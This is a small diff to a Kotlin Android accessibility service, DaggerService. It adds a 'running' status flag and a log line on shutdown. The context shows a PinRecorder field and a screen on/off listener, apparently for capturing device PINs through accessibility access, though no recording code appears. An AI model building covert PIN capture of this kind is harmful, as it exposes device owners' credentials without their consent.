@@ -24,6 +24,7 @@ class DaggerService : AccessibilityService() {
 
     companion object {
         private val TAG: String = DaggerService::class.java.name
+        var running: Boolean = false
     }
 
     lateinit var pinRecorder: PinRecorder
@@ -84,6 +85,8 @@ class DaggerService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         unregisterReceiver(receiver)
+        running = false
+        Log.d(TAG, "Stopping DaggerService.")
     }
 
     private fun accessibilityServiceInfo(): AccessibilityServiceInfo {
@@ -107,6 +110,7 @@ class DaggerService : AccessibilityService() {
         val intentFilter = IntentFilter(Intent.ACTION_SCREEN_ON)
         intentFilter.addAction(Intent.ACTION_SCREEN_OFF)
         registerReceiver(receiver, intentFilter)
+        running = true
         Log.d(TAG, "Registering screen state listener")
     }
 
